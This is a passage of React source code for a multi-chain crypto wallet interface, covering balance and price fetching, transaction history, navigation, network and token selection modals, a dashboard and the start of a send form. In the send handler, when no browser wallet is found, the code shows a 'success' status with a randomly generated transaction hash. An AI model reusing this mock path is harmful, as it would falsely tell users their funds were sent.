                                    chainKey: '0x1',
                                    color: '#ccc'
                                });
                            }
                        }
                    });
                }
                
                // Calculate allocations
                const finalAssets = newAssets.map(a => ({
                    ...a,
                    allocation: realTotalBalance > 0 ? ((a.value / realTotalBalance) * 100).toFixed(1) : 0
                })).sort((a, b) => b.value - a.value); // Sort by value

                applyChainAssets(finalAssets, address);
                if (!finalAssets || finalAssets.length === 0) {
                    let ethBalanceFallback = 0;
                    try {
                        const provider = new ethers.JsonRpcProvider('https://eth.llamarpc.com');
                        const balWei = await provider.getBalance(address);
                        ethBalanceFallback = parseFloat(ethers.formatEther(balWei));
                    } catch (e) { }
                    let priceFallback = 0;
                    let changeFallback = 0;
                    try {
                        const resp = await fetch(`/api/price?ids=ethereum&vs=usd&include_change=true`);
                        const dat = await resp.json();
                        priceFallback = dat.ethereum?.usd || 0;
                        changeFallback = dat.ethereum?.usd_24h_change || 0;
                    } catch (e) { }
                    const val = ethBalanceFallback * priceFallback;
                    if (ethBalanceFallback > 0 || priceFallback > 0) {
                        applyChainAssets([{
                            id: 'ethereum',
                            name: 'Ethereum',
                            symbol: 'ETH',
                            amount: ethBalanceFallback,
                            price: priceFallback,
                            change: changeFallback,
                            value: val,
                            chainKey: '0x1',
                            color: '#627eea'
                        }], address);
                    } else {
                        applyChainAssets([], address);
                    }
                }

                // Fetch Real Transactions (ETH & Tokens)
                try {
                   const txResponse = await fetch(`/api/ethplorer/address-history?address=${address}&limit=50`);
                    const txData = await txResponse.json();
                    
                    if (txData.operations && Array.isArray(txData.operations)) {
                        const realTxs = txData.operations.map(tx => {
                            const isReceive = tx.to.toLowerCase() === address.toLowerCase();
                            const tokenSymbol = tx.tokenInfo ? tx.tokenInfo.symbol : 'ETH';
                            const decimals = tx.tokenInfo ? parseInt(tx.tokenInfo.decimals) : 18;
                            const val = parseFloat(tx.value) / Math.pow(10, decimals);
                            
                            return {
                                id: tx.transactionHash,
                                type: isReceive ? 'receive' : 'send',
                                amount: val < 0.0001 ? '< 0.0001' : val.toFixed(4),
                                symbol: tokenSymbol,
                                asset: tx.tokenInfo ? tx.tokenInfo.name : 'Ethereum',
                                date: new Date(tx.timestamp * 1000).toLocaleDateString(),
                                status: 'Confirmed',
                                hash: tx.transactionHash
                            };
                        });
                        setTransactions(realTxs);
                    }
                } catch (e) {
                    console.error("Failed to fetch transactions", e);
                }
            } else {
                // Multi-Chain Support (Non-Ethereum EVM)
                const chainInfo = CHAIN_CONFIG[currentChainId] || { name: 'Unknown Chain', symbol: 'ETH', id: 'ethereum' };
                
                // Fetch Native Price
                let price = 0;
                let change = 0;
                try {
                    const response = await fetch(`/api/price?ids=${chainInfo.id}&vs=usd&include_change=true`);
                    const data = await response.json();
                    price = data[chainInfo.id]?.usd || 0;
                    change = data[chainInfo.id]?.usd_24h_change || 0;
                } catch (e) { }

                const usdValue = initialBalance * price;
                
                // Initialize with Native Asset
                let newAssets = [{
                    id: chainInfo.id,
                    name: chainInfo.name,
                    symbol: chainInfo.symbol,
                    amount: initialBalance,
                    price: price,
                    change: change,
                    value: usdValue,
                    allocation: 100,
                    chainKey: currentChainId,
                    color: chainInfo.color || '#627eea'
                }];

                // Fetch Tokens for this Chain (Limited set for demo)
                let provider;
                if (chainInfo.type === 'evm') {
                    if (type === 'imported' && chainInfo.rpcUrl) {
                        provider = new ethers.JsonRpcProvider(chainInfo.rpcUrl);
                    } else if (window.ethereum) {
                        provider = new ethers.BrowserProvider(window.ethereum);
                    }
                }

                if (provider && TOKEN_CONTRACTS[currentChainId]) {
                    const tokens = TOKEN_CONTRACTS[currentChainId];
                    
                    // Parallel Fetch
                    const tokenPromises = Object.entries(tokens).map(async ([symbol, address]) => {
                        try {
                            const contract = new ethers.Contract(address, ERC20_ABI, provider);
                            const balanceWei = await contract.balanceOf(walletAddress);
                            if (balanceWei > 0) {
                                const decimals = await contract.decimals().catch(() => 18);
                                const balance = parseFloat(ethers.formatUnits(balanceWei, decimals));
                                
                                // Fetch price for token
                                let tokenPrice = 0;
                                let tokenChange = 0;
                                // Need ID mapping or search. For now, simplistic mapping:
                                const idMap = { 'USDT': 'tether', 'USDC': 'usd-coin', 'ETH': 'ethereum', 'WETH': 'ethereum' };
                                const tokenId = idMap[symbol];
                                
                                if (tokenId) {
                                    try {
                                        const resp = await fetch(`/api/price?ids=${tokenId}&vs=usd&include_change=true`);
                                        const tData = await resp.json();
                                        tokenPrice = tData[tokenId]?.usd || 0;
                                        tokenChange = tData[tokenId]?.usd_24h_change || 0;
                                    } catch (e) { }
                                }
                                
                                const value = balance * tokenPrice;
                                return {
                                    id: address,
                                    name: symbol,
                                    symbol: symbol,
                                    amount: balance,
                                    price: tokenPrice,
                                    change: tokenChange,
                                    value: value,
                                    chainKey: currentChainId,
                                    color: '#ccc'
                                };
                            }
                        } catch (e) {
                            console.error(`Failed to fetch ${symbol}`, e);
                        }
                        return null;
                    });
                    
                    const results = await Promise.all(tokenPromises);
                    const validTokens = results.filter(t => t !== null);
                    newAssets = [...newAssets, ...validTokens];
                }
                
                // Recalculate Totals
                const realTotalBalance = newAssets.reduce((acc, curr) => acc + curr.value, 0);
                const finalAssets = newAssets.map(a => ({
                    ...a,
                    allocation: realTotalBalance > 0 ? ((a.value / realTotalBalance) * 100).toFixed(1) : 0
                })).sort((a, b) => b.value - a.value);

                applyChainAssets(finalAssets, address);

                try {
                   const txResp = await fetch(`/api/ethplorer/address-transactions?address=${address}&limit=20`);
                    const txs = await txResp.json();
                    if (Array.isArray(txs)) {
                        const mapped = txs.map(t => {
                            const isReceive = t.to && t.to.toLowerCase() === address.toLowerCase();
                            const isSend = t.from && t.from.toLowerCase() === address.toLowerCase();
                            const symbol = t.tokenSymbol || 'ETH';
                            const amount = t.value || (t.tokenAmount || 0);
                            return {
                                id: t.hash,
                                type: isSend ? 'send' : 'receive',
                                amount: parseFloat(amount).toFixed(6),
                                symbol,
                                asset: symbol,
                                date: new Date((t.timestamp || Date.now()) * 1000).toLocaleDateString(),
                                status: 'Confirmed',
                                hash: t.hash
                            };
                        });
                        setTransactions(mapped);
                    }
                } catch (e) {
                    console.error("Failed to fetch ETH transactions", e);
                }
            }

        } catch (e) {
            console.error("Failed to fetch wallet data", e);
            // Keep claimed tokens even if chain fetch fails
            applyChainAssets([], address);
        }
    } else {
        // Phantom / Solana Logic
        let price = 0;
        try {
            const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
            const data = await response.json();
            price = data.solana?.usd || 0;
        } catch (e) {}

        const val = initialBalance * price;
        applyChainAssets([{
             id: 'solana',
             name: 'Solana',
             symbol: 'SOL',
             amount: initialBalance,
             price: price,
             change: 0,
             value: val,
             color: '#14F195'
        }], address);
    }
    
    setLoading(false);
  };

  const resetWallet = () => {
    setIsRealWallet(false);
    setWalletAddress('');
    setChainId(null);
    setWalletType(null);
    setAssets([]);
    setTransactions([]);
    setTotalBalance(0);
    setLoading(false);
    setNotifications([]);
    
    // Clear persisted state
    localStorage.removeItem('user_wallet_connected');
    localStorage.removeItem('user_wallet_address');
    localStorage.removeItem('user_chain_id');
    localStorage.removeItem('user_wallet_type');
    localStorage.removeItem('user_eth_address');
    localStorage.removeItem('user_btc_address');
    localStorage.removeItem('user_sol_address');
    localStorage.removeItem('user_sui_address');
  };

  const getAddressForChain = (chain) => {
    if (chain.type === 'evm') return ethAddress || walletAddress;
    if (chain.type === 'btc') return btcAddress;
    if (chain.type === 'sol') return solAddress;
    if (chain.type === 'sui') return suiAddress;
    return '';
  };

  return (
    <CryptoContext.Provider value={{ assets, setAssets, transactions, setTransactions, totalBalance, setTotalBalance, loading, isRealWallet, walletAddress, chainId, connectRealWallet, resetWallet, switchNetwork, ethAddress, btcAddress, solAddress, suiAddress, addCustomToken, notifications, setNotifications, addNotification }}>
      {children}
    </CryptoContext.Provider>
  );
};

class ErrorBoundary extends React.Component {
  constructor(props) {
    super(props);
    this.state = { hasError: false, error: null };
  }
  static getDerivedStateFromError(error) {
    return { hasError: true, error };
  }
  componentDidCatch(error, errorInfo) {
    console.error('UI Error:', error, errorInfo);
  }
  render() {
    if (this.state.hasError) {
      return (
        <div className="app-container" style={{ padding: '2rem', color: '#fff' }}>
          <div className="section-card" style={{ background: '#111', border: '1px solid #333', borderRadius: 12, padding: '1.5rem' }}>
            <h3 style={{ marginTop: 0 }}>Something went wrong</h3>
            <div style={{ color: '#bbb', marginBottom: '1rem' }}>The page failed to render. Try reloading.</div>
            <button className="btn-login" onClick={() => window.location.reload()}>Reload</button>
          </div>
        </div>
      );
    }
    return this.props.children;
  }
}
// Custom Logo Component
const SafeparkLogo = ({ size = 32, className = "" }) => (
  <svg width={size} height={size} viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg" className={className}>
    <rect x="2" y="2" width="36" height="36" rx="12" stroke="var(--accent-green)" strokeWidth="2" fill="var(--accent-green)" fillOpacity="0.1"/>
    <path d="M26 14C26 14 22 11 18 11C14 11 11 13 11 16C11 19 14 20 18 20C22 20 25 21 25 24C25 27 22 29 18 29C14 29 10 26 10 26" stroke="var(--accent-green)" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"/>
    <circle cx="28" cy="12" r="3" fill="var(--accent-green)"/>
  </svg>
);

const generateChartData = (period, baseValue = 100000, volatility = null) => {
  const data = [];
  let points = 24;
  let labelFormat = (i) => `${i}:00`;
  
  // Default volatility based on baseValue if not provided
  let vol = volatility || (baseValue * 0.02); // 2% default volatility

  if (period === 'Week') {
    points = 7;
    labelFormat = (i) => ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun'][i];
    vol = volatility || (baseValue * 0.05);
  } else if (period === 'Month') {
    points = 30;
    labelFormat = (i) => `${i + 1}`;
    vol = volatility || (baseValue * 0.1);
  } else if (period === 'Year') {
    points = 12;
    labelFormat = (i) => ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'][i];
    vol = volatility || (baseValue * 0.2);
  } else if (period === 'All') {
    points = 7;
    labelFormat = (i) => `${2020 + i}`;
    vol = volatility || (baseValue * 0.5);
  }

  let value = baseValue; 
  const rawData = [];
  let currentValue = baseValue;
  
  if (baseValue === 0) {
      for (let i = 0; i < points; i++) {
        data.push({ time: labelFormat(i), value: 0 });
      }
      return data;
  }
  
  for (let i = 0; i < points; i++) {
     rawData.unshift(currentValue);
     currentValue = currentValue + (Math.random() - 0.5) * vol;
     if (currentValue < 0) currentValue = baseValue * 0.1;
  }
  
  for (let i = 0; i < points; i++) {
    data.push({ time: labelFormat(i), value: rawData[i] });
  }
  return data;
};

const CHART_DATA_SETS = {
  'Day': generateChartData('Day', 0),
  'Week': generateChartData('Week', 0),
  'Month': generateChartData('Month', 0),
  'Year': generateChartData('Year', 0),
  'All': generateChartData('All', 0),
};

const ASSETS = [];

const Sidebar = ({ activeTab, setActiveTab, onLogout }) => (
  <aside className="sidebar">
    <div className="logo" onClick={() => setActiveTab('dashboard')} style={{cursor: 'pointer'}}>
      <div className="logo-icon">
        <SafeparkLogo size={28} />
      </div>
      SecureWallet
    </div>

    <div className="nav-group">
      <div className="nav-label">Menu</div>
      <button className={`nav-item ${activeTab === 'dashboard' ? 'active' : ''}`} onClick={() => setActiveTab('dashboard')}>
        <LayoutDashboard size={20} /> Portfolio
      </button>
      <button className={`nav-item ${activeTab === 'accounts' ? 'active' : ''}`} onClick={() => setActiveTab('accounts')}>
        <Wallet size={20} /> Accounts
      </button>
      <button className={`nav-item ${activeTab === 'send' ? 'active' : ''}`} onClick={() => setActiveTab('send')}>
        <Send size={20} /> Send
      </button>
      <button className={`nav-item ${activeTab === 'receive' ? 'active' : ''}`} onClick={() => setActiveTab('receive')}>
        <ArrowDownLeft size={20} /> Receive
      </button>
      <button className={`nav-item ${activeTab === 'buy' ? 'active' : ''}`} onClick={() => setActiveTab('buy')}>
        <CreditCard size={20} /> Buy / Sell
      </button>
      <button className={`nav-item ${activeTab === 'swap' ? 'active' : ''}`} onClick={() => setActiveTab('swap')}>
        <Repeat size={20} /> Swap
      </button>
      <button className={`nav-item ${activeTab === 'history' ? 'active' : ''}`} onClick={() => setActiveTab('history')}>
        <History size={20} /> History
      </button>
      <button className={`nav-item ${activeTab === 'device' ? 'active' : ''}`} onClick={() => setActiveTab('device')}>
        <Smartphone size={20} /> Device
      </button>
    </div>

    <div className="nav-group">
      <div className="nav-label">Favorite</div>
      <button className="nav-item" onClick={() => setActiveTab('accounts')} style={{ cursor: 'pointer' }}>
        <div style={{ width: 20, height: 20, borderRadius: '50%', background: '#627eea', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 10, color: 'white' }}>Ξ</div>
        ETH
      </button>
      <button className="nav-item" onClick={() => setActiveTab('receive')} style={{ cursor: 'pointer' }}>
        <div style={{ width: 20, height: 20, borderRadius: '50%', background: '#f7931a', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 10, color: 'white' }}>₿</div>
        BTC
      </button>
    </div>

    <div style={{ marginTop: 'auto', paddingTop: '1rem', borderTop: '1px solid var(--border)' }}>
       <button className="nav-item" onClick={onLogout} style={{ width: '100%', color: '#ef4444' }}>
        <LogOut size={20} /> Logout
      </button>
    </div>
  </aside>
);

const MobileNav = ({ activeTab, setActiveTab, onLogout }) => (
  <nav className="mobile-nav">
    <div className={`mobile-nav-item ${activeTab === 'dashboard' ? 'active' : ''}`} onClick={() => setActiveTab('dashboard')}>
      <LayoutDashboard size={20} />
      <span>Home</span>
    </div>
    <div className={`mobile-nav-item ${activeTab === 'accounts' ? 'active' : ''}`} onClick={() => setActiveTab('accounts')}>
      <Wallet size={20} />
      <span>Assets</span>
    </div>
    <div className={`mobile-nav-item ${activeTab === 'send' ? 'active' : ''}`} onClick={() => setActiveTab('send')}>
      <Send size={20} />
      <span>Send</span>
    </div>
    <div className={`mobile-nav-item ${activeTab === 'receive' ? 'active' : ''}`} onClick={() => setActiveTab('receive')}>
      <ArrowDownLeft size={20} />
      <span>Receive</span>
    </div>
    <div className={`mobile-nav-item ${activeTab === 'history' ? 'active' : ''}`} onClick={() => setActiveTab('history')}>
      <History size={20} />
      <span>History</span>
    </div>
    <div className="mobile-nav-item" onClick={onLogout} style={{ color: '#ef4444' }}>
      <LogOut size={20} />
      <span>Logout</span>
    </div>
  </nav>
);

const Header = ({ title, setActiveTab }) => {
  const [showNotifs, setShowNotifs] = useState(false);
  const [showNetworkModal, setShowNetworkModal] = useState(false);
  const { notifications, setNotifications, chainId, switchNetwork } = useContext(CryptoContext);

  const unreadCount = notifications.filter(n => !n.read).length;

  const markAllRead = () => {
      // In a real app you'd update state/backend
      // For now just visually clear or keep them
  };
  const currentChain = CHAIN_CONFIG[chainId] || null;

  return (
    <header className="header">
      <div className="breadcrumbs">
        Menu <span>/</span> <span className="current">{title}</span>
      </div>
      <div className="header-actions">
        <button 
          className="header-stat"
          onClick={() => setShowNetworkModal(true)}
          style={{ cursor: 'pointer' }}
        >
          <div style={{ width: 8, height: 8, borderRadius: '50%', background: currentChain?.color || 'var(--accent-green)' }}></div>
          {currentChain?.name || 'Select Network'}
        </button>
        <div style={{ position: 'relative' }}>
          <button 
            onClick={() => setShowNotifs(!showNotifs)} 
            style={{ color: showNotifs ? '#fff' : 'var(--text-secondary)', position: 'relative' }}
          >
            <Bell size={20} />
            {unreadCount > 0 && (
                <span style={{ 
                    position: 'absolute', top: -2, right: -2, 
                    width: 8, height: 8, background: 'red', borderRadius: '50%', 
                    border: '2px solid var(--bg-app)' 
                }}></span>
            )}
          </button>
          {showNotifs && (
            <div className="notifications-dropdown">
              <div className="dropdown-header">
                <span>Notifications</span>
                <button onClick={() => setShowNotifs(false)}><X size={16} /></button>
              </div>
              <div className="notification-list">
                {notifications.length === 0 ? (
                    <div style={{ padding: '2rem', textAlign: 'center', color: 'var(--text-secondary)', fontSize: '0.85rem' }}>
                        No new notifications
                    </div>
                ) : (
                    notifications.map(notif => (
                        <div key={notif.id} className="notification-item unread">
                            <div className="notif-icon" style={{ color: notif.type === 'error' ? '#ef4444' : 'var(--accent-green)' }}>
                                {notif.type === 'security' ? <ShieldCheck size={16} /> : <ArrowDownLeft size={16} />}
                            </div>
                            <div>
                                <div className="notif-title">{notif.title}</div>
                                <div className="notif-desc">{notif.desc}</div>
                                <div className="notif-time">{timeAgo(new Date(notif.time))}</div>
                            </div>
                        </div>
                    ))
                )}
              </div>
            </div>
          )}
        </div>
        <button onClick={() => setActiveTab('settings')} style={{ color: 'var(--text-secondary)' }}><Settings size={20} /></button>
      </div>
      {showNetworkModal && <ChangeNetworkModal onClose={() => setShowNetworkModal(false)} onSelect={switchNetwork} />}
    </header>
  );
};

const AssetDetailModal = ({ asset, onClose }) => {
  if (!asset) return null;
  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="modal-content" onClick={e => e.stopPropagation()}>
        <div className="modal-header">
          <div style={{ display: 'flex', alignItems: 'center', gap: '1rem' }}>
            <div style={{ width: 40, height: 40, borderRadius: '50%', background: asset.color, display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '1.2rem', color: '#fff' }}>
              {asset.symbol[0]}
            </div>
            <div>
              <h3>{asset.name}</h3>
              <div style={{ fontSize: '0.85rem', color: 'var(--text-secondary)' }}>{asset.symbol}</div>
            </div>
          </div>
          <button onClick={onClose}><X size={20} /></button>
        </div>
        <div style={{ padding: '1.5rem' }}>
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1rem', marginBottom: '1.5rem' }}>
            <div style={{ background: '#000', padding: '1rem', borderRadius: '8px' }}>
              <div style={{ fontSize: '0.85rem', color: 'var(--text-secondary)', marginBottom: '0.5rem' }}>Balance</div>
              <div style={{ fontSize: '1.2rem', fontWeight: 'bold' }}>{asset.amount} {asset.symbol}</div>
            </div>
            <div style={{ background: '#000', padding: '1rem', borderRadius: '8px' }}>
              <div style={{ fontSize: '0.85rem', color: 'var(--text-secondary)', marginBottom: '0.5rem' }}>Value</div>
              <div style={{ fontSize: '1.2rem', fontWeight: 'bold' }}>${asset.value.toLocaleString()}</div>
            </div>
          </div>
          <div style={{ display: 'flex', gap: '1rem' }}>
            <button className="btn-login" style={{ flex: 1 }}>Send</button>
            <button className="btn-login" style={{ flex: 1, background: 'var(--bg-card)', border: '1px solid var(--border)' }}>Receive</button>
          </div>
        </div>
      </div>
    </div>
  );
};

const ChangeNetworkModal = ({ onClose, onSelect }) => {
  const { ethAddress, btcAddress, solAddress, suiAddress, walletAddress, isRealWallet, addNotification } = useContext(CryptoContext);

  const getAddressForChain = (chain) => {
    if (chain.type === 'evm') return ethAddress || walletAddress;
    if (chain.type === 'btc') return btcAddress;
    if (chain.type === 'sol') return solAddress;
    if (chain.type === 'sui') return suiAddress;
    return '';
  };

  const networks = Object.entries(CHAIN_CONFIG).map(([chainKey, config]) => ({
    chainKey,
    ...config,
    address: getAddressForChain(config)
  }));

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    addNotification('Address Copied', 'Address copied to clipboard', 'success');
  };

  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="modal-content" onClick={e => e.stopPropagation()} style={{ maxHeight: '80vh', overflowY: 'auto' }}>
        <div className="modal-header">
          <h3>Change network</h3>
          <button onClick={onClose}><X size={20} /></button>
        </div>
        <div className="network-list" style={{ padding: '0 1rem 1rem' }}>
          {networks.map(net => (
            <div 
              key={net.chainKey} 
              className="network-item-card"
              onClick={() => { onSelect(net.chainKey); onClose(); }}
              style={{ 
                display: 'flex', alignItems: 'center', justifyContent: 'space-between',
                padding: '1rem', marginBottom: '0.75rem',
                background: 'rgba(255,255,255,0.05)', borderRadius: '12px',
                cursor: 'pointer', border: '1px solid transparent'
              }}
              onMouseOver={(e) => e.currentTarget.style.borderColor = 'var(--border)'}
              onMouseOut={(e) => e.currentTarget.style.borderColor = 'transparent'}
            >
              <div style={{ display: 'flex', alignItems: 'center', gap: '1rem', flex: 1, overflow: 'hidden' }}>
                <div style={{ 
                  width: 40, height: 40, borderRadius: '10px', 
                  background: '#fff', display: 'flex', alignItems: 'center', justifyContent: 'center',
                  flexShrink: 0
                }}>
                   {/* Simple Icon Logic */}
                   <div style={{ fontWeight: 'bold', color: net.color, fontSize: '1.2rem' }}>
                      {net.symbol[0]}
                   </div>
                </div>
                <div style={{ overflow: 'hidden' }}>
                  <div style={{ fontWeight: 600, fontSize: '1rem' }}>{net.name}</div>
                  <div style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', textOverflow: 'ellipsis', overflow: 'hidden', whiteSpace: 'nowrap' }}>
                    {net.address ? `${net.address.slice(0, 6)}...${net.address.slice(-4)}` : 'Not Connected'}
                  </div>
                </div>
              </div>
              
              <div style={{ display: 'flex', gap: '0.5rem' }}>
                <button 
                  onClick={(e) => { e.stopPropagation(); addNotification('QR Ready', `${net.name} address QR is available in Receive`, 'info'); }}
                  style={{ 
                    width: 36, height: 36, borderRadius: '8px', 
                    background: 'rgba(255,255,255,0.1)', border: 'none', 
                    color: '#fff', display: 'flex', alignItems: 'center', justifyContent: 'center',
                    cursor: 'pointer'
                  }}
                >
                  <QrCode size={18} />
                </button>
                <button 
                  onClick={(e) => { e.stopPropagation(); copyToClipboard(net.address); }}
                  style={{ 
                    width: 36, height: 36, borderRadius: '8px', 
                    background: 'rgba(255,255,255,0.1)', border: 'none', 
                    color: '#fff', display: 'flex', alignItems: 'center', justifyContent: 'center',
                    cursor: 'pointer'
                  }}
                >
                  <Copy size={18} />
                </button>
              </div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
};

const CROSS_CHAIN_TOKENS = [
  { id: 'sol-usdt', name: 'Tether', symbol: 'USDT', color: '#26a17b', amount: 0, price: 0, value: 0, chainKey: 'solana' },
  { id: 'sol-sol', name: 'Solana', symbol: 'SOL', color: '#14F195', amount: 0, price: 0, value: 0, chainKey: 'solana' },
  { id: 'eth-usdt', name: 'Tether', symbol: 'USDT', color: '#26a17b', amount: 0, price: 0, value: 0, chainKey: '0x1' },
  { id: 'eth-eth', name: 'Ethereum', symbol: 'ETH', color: '#627eea', amount: 0, price: 0, value: 0, chainKey: '0x1' }
];
const TokenSelectModal = ({ assets, mode, onClose, onSelect, includeCrossChain = false, currentChainId = null }) => {
  const merged = includeCrossChain ? [...assets, ...CROSS_CHAIN_TOKENS] : assets;
  const deduped = merged.filter((item, index, arr) => {
    const key = `${item.symbol}-${item.chainKey || currentChainId || ''}`;
    const firstIdx = arr.findIndex(a => `${a.symbol}-${a.chainKey || currentChainId || ''}` === key);
    return firstIdx === index;
  });
  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="modal-content" onClick={e => e.stopPropagation()}>
        <div className="modal-header">
          <h3>Select Token</h3>
          <button onClick={onClose}><X size={20} /></button>
        </div>
        <div className="token-list">
          {deduped.map(asset => (
            <div 
              key={asset.id} 
              className="token-item" 
              onClick={() => { onSelect(asset); onClose(); }}
              style={{ cursor: 'pointer' }}
            >
              <div className="token-icon" style={{ background: asset.color }}>{asset.symbol[0]}</div>
              <div className="item-info">
                <h4>{asset.name}</h4>
                <span>{asset.symbol}</span>
              </div>
              <div style={{ marginLeft: 'auto', textAlign: 'right' }}>
                <div>{asset.amount}</div>
                <div style={{ fontSize: '0.8rem', color: 'var(--text-secondary)' }}>${(asset.value || 0).toFixed(2)}</div>
              </div>
            </div>
          ))}
          {deduped.length === 0 && (
             <div style={{ padding: '2rem', textAlign: 'center', color: 'var(--text-secondary)' }}>
                No assets found.
             </div>
          )}
        </div>
      </div>
    </div>
  );
};

function Dashboard({ setActiveTab }) {
  const { totalBalance, loading, isRealWallet, assets } = useContext(CryptoContext);
  const [balance, setBalance] = useState(0); 
  const [changeAmount, setChangeAmount] = useState(0);
  const [changePercent, setChangePercent] = useState(0);

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  useEffect(() => {
    setBalance(totalBalance);
    if (isRealWallet && Array.isArray(assets) && assets.length > 0 && totalBalance > 0) {
      const weighted = assets.reduce((acc, a) => {
        const val = Number(a.value) || 0;
        const ch = Number(a.change) || 0; // percent
        return acc + (val * ch);
      }, 0);
      const pct = weighted / totalBalance; // already percent-weighted sum
      const amt = (pct / 100) * totalBalance;
      setChangePercent(isFinite(pct) ? pct : 0);
      setChangeAmount(isFinite(amt) ? amt : 0);
    } else {
      setChangeAmount(0);
      setChangePercent(0);
    }
  }, [totalBalance, loading, isRealWallet, assets]);

  return (
    <div className="dashboard-grid">
      <CryptoTicker />
      <ActionCards setActiveTab={setActiveTab} />
      
      <div className="total-balance-section">
        <div className="balance-label">Total balance <ArrowDownLeft size={16} /></div>
        <div className="balance-amount">
          <span className="balance-value-text">
            ${balance.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
          </span>
          {balance > 0 && (
            <>
              <div className="balance-change" style={{ color: changePercent >= 0 ? 'var(--accent-green)' : '#ef4444' }}>
                {changePercent >= 0 ? <ArrowUpRight size={16} /> : <ArrowDownLeft size={16} />} {Math.abs(changePercent).toFixed(2)}%
              </div>
              <span style={{ fontSize: '1.25rem', color: changeAmount >= 0 ? 'var(--accent-green)' : '#ef4444', fontWeight: 600 }}>
                {(changeAmount >= 0 ? '+' : '-')}${Math.abs(changeAmount).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
              </span>
            </>
          )}
          
          <div className="balance-actions">
            <button className="pill-btn" onClick={() => setActiveTab('send')}><Send size={16} /> Send</button>
            <button className="pill-btn" onClick={() => setActiveTab('receive')}><ArrowDownLeft size={16} /> Receive</button>
          </div>
        </div>
      </div>

      <div className="grid-cols-2">
        <BalanceChart />
        <div className="section-card">
            <div className="section-header">Recent Transactions</div>
            {isRealWallet ? (
                <div style={{ padding: '2rem', textAlign: 'center', color: 'var(--text-secondary)' }}>
                    No recent transactions found.
                </div>
            ) : (
                <div style={{ padding: '2rem', textAlign: 'center', color: 'var(--text-secondary)' }}>
                    Connect wallet to view transactions.
                </div>
            )}
        </div>
      </div>

      <AssetsList />
    </div>
  );
}

const SendView = () => {
  const { isRealWallet, walletAddress, chainId, assets, switchNetwork, addNotification } = useContext(CryptoContext);
  const [recipient, setRecipient] = useState('');
  const [amount, setAmount] = useState('');
  const [status, setStatus] = useState(''); // 'pending', 'success', 'error'
  const [txHash, setTxHash] = useState('');
  const [error, setError] = useState('');
  const [showNetworkModal, setShowNetworkModal] = useState(false);
  const [selectedAsset, setSelectedAsset] = useState(null);
  const [showTokenModal, setShowTokenModal] = useState(false);

  const currentChain = CHAIN_CONFIG[chainId];

  // Update selected asset when chain/assets change
  useEffect(() => {
    if (assets.length > 0) {
        // Try to keep current selection if valid, else default to native (usually first or matching chain symbol)
        if (selectedAsset) {
            const exists = assets.find(a => a.symbol === selectedAsset.symbol);
            if (exists) {
                setSelectedAsset(exists);
            } else {
                setSelectedAsset(assets[0]);
            }
        } else {
            setSelectedAsset(assets[0]);
        }
    }
  }, [assets, chainId]);

  const handleSend = async (e) => {
    e.preventDefault();
    setError('');
    
    if (!isRealWallet) {
        setStatus('error');
        setTxHash('Please connect a wallet to send funds.');
        return;
    }
    
    // Use selected asset or fallback to chain native
    const assetToSend = selectedAsset || assets.find(a => a.symbol === (CHAIN_CONFIG[chainId]?.symbol || 'ETH'));
    const balance = assetToSend ? assetToSend.amount : 0;
    
    if (balance === 0) {
        setError(`You have 0 ${assetToSend.symbol}. Please deposit funds first.`);
        return;
    }
    
    if (parseFloat(amount) > balance) {
        setError(`Insufficient balance. You have ${balance} ${assetToSend.symbol} but are trying to send ${amount} ${assetToSend.symbol}.`);
        return;
    }

    setStatus('pending');
    addNotification('Sending', `Confirm sending ${amount} ${assetToSend.symbol}`, 'info');
    try {
        const valueWei = (parseFloat(amount) * 1e18).toString(16); // Simplified decimals
        
        if (typeof window.ethereum !== 'undefined') {
            // Check if Native or Token
            const isNative = assetToSend.id === 'ethereum' || assetToSend.id === 'bitcoin' || assetToSend.id === 'binancecoin' || assetToSend.id === 'solana'; // Simplistic check
            // Better check: does it have a contract address? 
            // In our data, tokens have contract address as ID (except mapped ones).
            // For this demo, let's assume if it has '0x' in ID and length > 10 it's a token
            
            let txHash;
            if (!isNative && assetToSend.id.startsWith('0x') && assetToSend.id.length > 10) {
                // ERC20 Transfer
                const provider = new ethers.BrowserProvider(window.ethereum);
                const signer = await provider.getSigner();
                const contract = new ethers.Contract(assetToSend.id, ["function transfer(address to, uint amount) returns (bool)"], signer);
                const tx = await contract.transfer(recipient, ethers.parseUnits(amount, 18)); // Assuming 18 decimals
                txHash = tx.hash;
            } else {
                // Native Transfer
                txHash = await window.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [
                        {
                            from: walletAddress,
                            to: recipient,
                            value: valueWei,
                        },
                    ],
                });
            }
            
            setStatus('success');
            setTxHash(txHash);
            addNotification('Sent', `Sent ${amount} ${assetToSend.symbol}`, 'success');

            // Track Transaction
            fetch('/api/track/transaction', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    address: walletAddress,
                    hash: txHash,
                    type: 'send',
                    amount: amount,
                    symbol: assetToSend.symbol
                })
            }).catch(e => console.error("Tx Tracking failed", e));

        } else {
            // Mock success
             setTimeout(() => {
                setStatus('success');
                setTxHash('0x' + Math.random().toString(16).substr(2, 64));
                addNotification('Sent', `Sent ${amount} ${assetToSend.symbol}`, 'success');
             }, 2000);
        }
    } catch (err) {
        console.error(err);
        setStatus('error');
        setTxHash(err.message);
        addNotification('Send Failed', err.message, 'error');
    }
  };

  const chainInfo = CHAIN_CONFIG[chainId] || { symbol: 'ETH' };
